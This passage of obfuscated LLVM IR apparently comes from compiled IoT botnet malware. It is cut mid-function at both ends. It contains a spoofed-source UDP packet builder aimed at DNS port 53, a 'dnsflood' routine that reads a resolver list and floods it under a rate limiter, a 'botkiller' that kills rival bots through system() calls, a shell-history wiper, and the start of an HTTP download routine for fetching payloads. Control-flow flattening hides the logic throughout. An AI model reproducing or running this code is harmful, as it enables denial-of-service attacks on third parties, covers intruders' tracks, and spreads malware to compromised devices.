  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %64 = bitcast i8* %63 to %struct.iphdr*
  store %struct.iphdr* %64, %struct.iphdr** %18, align 8
  %65 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %66 = bitcast %struct.iphdr* %65 to i8*
  %67 = load i8, i8* %66, align 4
  %68 = and i8 %67, 15
  %69 = or i8 %68, 64
  store i8 %69, i8* %66, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %71 = bitcast %struct.iphdr* %70 to i8*
  %72 = load i8, i8* %71, align 4
  %73 = and i8 %72, -16
  %74 = or i8 %73, 5
  store i8 %74, i8* %71, align 4
  %75 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 1
  store i8 0, i8* %76, align 1
  %77 = load i8*, i8** %11, align 8
  %78 = call i64 @strlen(i8* %77) #10
  %79 = add i64 %78, 1
  %80 = add i64 40, %79
  %81 = add i64 %80, 4
  %82 = trunc i64 %81 to i16
  %83 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %84 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %83, i32 0, i32 2
  store i16 %82, i16* %84, align 2
  %85 = call i32 @rand_cmwc()
  %86 = call i32 @htonl(i32 %85) #13
  %87 = trunc i32 %86 to i16
  %88 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i32 0, i32 3
  store i16 %87, i16* %89, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 4
  store i16 0, i16* %91, align 2
  %92 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i32 0, i32 5
  store i8 64, i8* %93, align 4
  %94 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %95 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %94, i32 0, i32 6
  store i8 17, i8* %95, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 7
  store i16 0, i16* %97, align 2
  %98 = load i8*, i8** %5, align 8
  %99 = call i32 @inet_addr(i8* %98) #2
  %100 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %101 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %100, i32 0, i32 8
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 9
  store i32 %104, i32* %106, align 4
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %108 = bitcast i8* %107 to i16*
  %109 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* %108, i32 %112)
  %114 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 7
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %117 = getelementptr inbounds i8, i8* %116, i64 20
  %118 = bitcast i8* %117 to %struct.udphdr*
  store %struct.udphdr* %118, %struct.udphdr** %19, align 8
  %119 = load i32, i32* %6, align 4
  %120 = trunc i32 %119 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #13
  %122 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.3* %123 to %struct.anon.4*
  %125 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %124, i32 0, i32 0
  store i16 %121, i16* %125, align 2
  %126 = call zeroext i16 @htons(i16 zeroext 53) #13
  %127 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.3* %128 to %struct.anon.4*
  %130 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load i8*, i8** %11, align 8
  %132 = call i64 @strlen(i8* %131) #10
  %133 = add i64 %132, 1
  %134 = add i64 20, %133
  %135 = add i64 %134, 4
  %136 = trunc i64 %135 to i16
  %137 = call zeroext i16 @htons(i16 zeroext %136) #13
  %138 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.3* %139 to %struct.anon.4*
  %141 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %140, i32 0, i32 2
  store i16 %137, i16* %141, align 2
  %142 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %143 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.3* %143 to %struct.anon.4*
  %145 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %144, i32 0, i32 3
  store i16 0, i16* %145, align 2
  %146 = load i8*, i8** %5, align 8
  %147 = call i32 @inet_addr(i8* %146) #2
  %148 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 0
  store i32 %147, i32* %148, align 4
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 1
  store i32 %151, i32* %152, align 4
  %153 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 2
  store i8 0, i8* %153, align 4
  %154 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 3
  store i8 17, i8* %154, align 1
  %155 = load i8*, i8** %11, align 8
  %156 = call i64 @strlen(i8* %155) #10
  %157 = add i64 %156, 1
  %158 = add i64 20, %157
  %159 = add i64 %158, 4
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #13
  %162 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 4
  store i16 %161, i16* %162, align 2
  %163 = load i8*, i8** %11, align 8
  %164 = call i64 @strlen(i8* %163) #10
  %165 = add i64 %164, 1
  %166 = add i64 32, %165
  %167 = add i64 %166, 4
  %168 = trunc i64 %167 to i32
  store i32 %168, i32* %21, align 4
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = call noalias i8* @malloc(i64 %170) #2
  store i8* %171, i8** %16, align 8
  %172 = load i8*, i8** %16, align 8
  %173 = bitcast %struct.ps_hdr* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %172, i8* %173, i64 12, i32 1, i1 false)
  %174 = load i8*, i8** %16, align 8
  %175 = getelementptr inbounds i8, i8* %174, i64 12
  %176 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %177 = bitcast %struct.udphdr* %176 to i8*
  %178 = load i8*, i8** %11, align 8
  %179 = call i64 @strlen(i8* %178) #10
  %180 = add i64 %179, 1
  %181 = add i64 20, %180
  %182 = add i64 %181, 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %175, i8* %177, i64 %182, i32 1, i1 false)
  %183 = load i8*, i8** %16, align 8
  %184 = bitcast i8* %183 to i16*
  %185 = load i32, i32* %21, align 4
  %186 = call zeroext i16 @csum(i16* %184, i32 %185)
  %187 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.3* %188 to %struct.anon.4*
  %190 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %189, i32 0, i32 3
  store i16 %186, i16* %190, align 2
  %191 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %191, i32* %22, align 4
  %192 = load i32, i32* %22, align 4
  store i32 %192, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 494284705, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 494284705, label %first
    i32 1571998725, label %195
    i32 -2094831709, label %196
    i32 1994478501, label %208
    i32 -983643889, label %212
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %193 = icmp eq i32 %.reload, -1
  %194 = select i1 %193, i32 1571998725, i32 -2094831709
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  store i32 -983643889, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i32, i32* %22, align 4
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %199 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  %201 = load i16, i16* %200, align 2
  %202 = zext i16 %201 to i64
  %203 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %204 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %204, %struct.sockaddr** %203, align 8
  %205 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %206 = load %struct.sockaddr*, %struct.sockaddr** %205, align 8
  %207 = call i64 @sendto(i32 %197, i8* %198, i64 %202, i32 0, %struct.sockaddr* %206, i32 16)
  store i32 1994478501, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i8*, i8** %16, align 8
  call void @free(i8* %209) #2
  %210 = load i32, i32* %22, align 4
  %211 = call i32 @close(i32 %210)
  store i32 -983643889, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %208, %196, %195, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @dnsflood(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %2, align 8
  %11 = call i32 @listFork()
  store i32 %11, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1048553671, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1048553671, label %first
    i32 301467879, label %14
    i32 974247202, label %15
    i32 -2107304784, label %37
    i32 -1616377770, label %39
    i32 131154197, label %45
    i32 -2065981056, label %54
    i32 2117496838, label %63
    i32 1261027962, label %68
    i32 1446419285, label %78
    i32 422575076, label %81
    i32 -1832161103, label %89
    i32 -1753301716, label %90
    i32 14869892, label %91
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %12 = icmp ne i32 %.reload, 0
  %13 = select i1 %12, i32 974247202, i32 301467879
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  ret void

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %2, align 8
  %17 = bitcast i8* %16 to %struct.thread_data*
  store %struct.thread_data* %17, %struct.thread_data** %3, align 8
  %18 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %19 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %18, i32 0, i32 1
  %20 = load i8*, i8** %19, align 8
  store i8* %20, i8** %4, align 8
  %21 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %22 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %21, i32 0, i32 2
  %23 = load i32, i32* %22, align 8
  store i32 %23, i32* %5, align 4
  %24 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %25 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %24, i32 0, i32 4
  %26 = load i32, i32* %25, align 8
  store i32 %26, i32* %6, align 4
  %27 = call i64 @time(i64* null) #2
  %28 = call i32 @getpid() #2
  %29 = sext i32 %28 to i64
  %30 = xor i64 %27, %29
  %31 = trunc i64 %30 to i32
  call void @init_rand(i32 %31)
  store i32 0, i32* %8, align 4
  %32 = call i64 @time(i64* null) #2
  %33 = load i32, i32* %6, align 4
  %34 = sext i32 %33 to i64
  %35 = add nsw i64 %32, %34
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %9, align 4
  store i32 -2107304784, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %10, align 8
  store i32 -1616377770, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %42 = call i8* @fgets(i8* %40, i32 100, %struct._IO_FILE* %41)
  %43 = icmp ne i8* %42, null
  %44 = select i1 %43, i32 131154197, i32 14869892
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %47 = call i64 @strlen(i8* %46) #10
  %48 = sub i64 %47, 1
  %49 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 10
  %53 = select i1 %52, i32 2117496838, i32 -2065981056
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %56 = call i64 @strlen(i8* %55) #10
  %57 = sub i64 %56, 1
  %58 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 2117496838, i32 1261027962
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #10
  %66 = sub i64 %65, 1
  %67 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %66
  store i8 0, i8* %67, align 1
  store i32 1261027962, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %4, align 8
  %70 = load i32, i32* %5, align 4
  %71 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  call void @dns_send(i8* %69, i32 %70, i8* %71, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i32 0, i32 0))
  %72 = load volatile i32, i32* @pps, align 4
  %73 = add i32 %72, 1
  store volatile i32 %73, i32* @pps, align 4
  %74 = load i32, i32* %8, align 4
  %75 = load volatile i32, i32* @limiter, align 4
  %76 = icmp sge i32 %74, %75
  %77 = select i1 %76, i32 1446419285, i32 422575076
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  %79 = load volatile i32, i32* @sleeptime, align 4
  %80 = call i32 @usleep(i32 %79)
  store i32 422575076, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %8, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %8, align 4
  %84 = call i64 @time(i64* null) #2
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = icmp sgt i64 %84, %86
  %88 = select i1 %87, i32 -1832161103, i32 -1753301716
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:90:                                     ; preds = %loopEntry
  store i32 -1616377770, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %93 = call i32 @fclose(%struct._IO_FILE* %92)
  store i32 -2107304784, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %91, %90, %81, %78, %68, %63, %54, %45, %39, %37, %15, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  %switchVar = alloca i32
  store i32 622856985, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 622856985, label %3
    i32 1410012365, label %4
    i32 2095429740, label %8
    i32 1748158555, label %31
    i32 -1508038491, label %34
    i32 -1304659707, label %36
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1410012365, i32* %switchVar
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  %7 = select i1 %6, i32 2095429740, i32 -1508038491
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %10 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i32 0, i32 0)) #2
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %13
  %15 = load i8*, i8** %14, align 8
  %16 = call i8* @strcat(i8* %11, i8* %15) #2
  %17 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %18 = call i32 @system(i8* %17)
  %19 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %19, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i32 0, i32 0)) #2
  %21 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %23
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strcat(i8* %21, i8* %25) #2
  %27 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %28 = call i8* @strcat(i8* %27, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0)) #2
  %29 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %30 = call i32 @system(i8* %29)
  store i32 1748158555, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %1, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %1, align 4
  store i32 1410012365, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i32 @sleep(i32 5)
  store i32 622856985, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %34, %31, %8, %4, %3, %switchDefault
  br label %loopEntry
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @binsBins() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %1, align 4
  %switchVar = alloca i32
  store i32 905995405, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 905995405, label %first
    i32 -1754952505, label %5
    i32 -1144080281, label %9
    i32 417647739, label %12
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp eq i32 %.reload, 0
  %4 = select i1 %3, i32 -1754952505, i32 -1144080281
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i8*, i8** @rekdevice, align 8
  %7 = call i32 @system(i8* %6)
  %8 = call i32 @sleep(i32 20)
  store i32 417647739, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %1, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i32 %10)
  store i32 417647739, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %9, %5, %first, %switchDefault
  br label %loopEntry
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @download(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i64, align 8
  %11 = alloca [1024 x i8], align 16
  %12 = alloca %struct._IO_FILE*, align 8
  %13 = alloca [4096 x i8], align 16
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %19, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -1958198289, i32* %switchVar
  %.reg2mem3 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1958198289, label %first
    i32 -1226203088, label %22
    i32 -822552532, label %23
    i32 667530402, label %28
    i32 963024237, label %33
    i32 -2083835734, label %37
    i32 -2036891133, label %38
    i32 -910615443, label %45
    i32 1973033275, label %52
    i32 -1266000058, label %54
    i32 1041784195, label %55
    i32 -1519476475, label %58
    i32 30357040, label %70
    i32 -615627394, label %75
    i32 -1659101448, label %76
    i32 -1878153935, label %88
    i32 -2130664473, label %93
    i32 397253007, label %104
    i32 785593368, label %105
    i32 1902369790, label %116
    i32 -52012983, label %123
    i32 1992675196, label %124
    i32 1729012988, label %128
    i32 533363332, label %132
    i32 668268654, label %133
    i32 817559548, label %138
    i32 134760318, label %146
    i32 -1678496624, label %149
    i32 -1376315560, label %154
    i32 533819547, label %162
    i32 -601962789, label %165
    i32 -1780685171, label %166
    i32 1209289246, label %167
    i32 -1194162379, label %170
    i32 -1654013551, label %171
    i32 -450691315, label %172
    i32 -1233132180, label %173
    i32 -1021205034, label %180
    i32 -162316567, label %181
    i32 -1723783386, label %185
    i32 1670056648, label %189
    i32 737166259, label %190
    i32 -208225854, label %195
    i32 502079959, label %203
    i32 1964165179, label %206
    i32 -1192077705, label %207
    i32 433393984, label %212
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %20 = icmp eq i32 %.reload, -1
  %21 = select i1 %20, i32 -1226203088, i32 -822552532
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 3, i32* %3, align 4
  store i32 433393984, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8*, i8** %4, align 8
  %25 = call i32 @strncmp(i8* %24, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i32 0, i32 0), i64 7) #10
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 963024237, i32 667530402
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 7
  %32 = call i8* @strcpy(i8* %29, i8* %31) #2
  store i32 -2083835734, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %35 = load i8*, i8** %4, align 8
  %36 = call i8* @strcpy(i8* %34, i8* %35) #2
  store i32 -2083835734, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -2036891133, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %42 = call i64 @strlen(i8* %41) #10
  %43 = icmp ult i64 %40, %42
  %44 = select i1 %43, i32 -910615443, i32 1973033275
  store i32 %44, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp ne i32 %50, 47
  store i32 1973033275, i32* %switchVar
  store i1 %51, i1* %.reg2mem3
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %53 = select i1 %.reload4, i32 -1266000058, i32 -1519476475
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 1041784195, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %7, align 4
  store i32 -2036891133, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %60
  store i8 0, i8* %61, align 1
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %62, align 4
  %63 = call zeroext i16 @htons(i16 zeroext 80) #13
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %63, i16* %64, align 2
  %65 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %66 = call i32 @inet_addr(i8* %65) #2
  %67 = zext i32 %66 to i64
  store i64 %67, i64* %10, align 8
  %68 = icmp eq i64 %67, -1
  %69 = select i1 %68, i32 30357040, i32 -1878153935
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
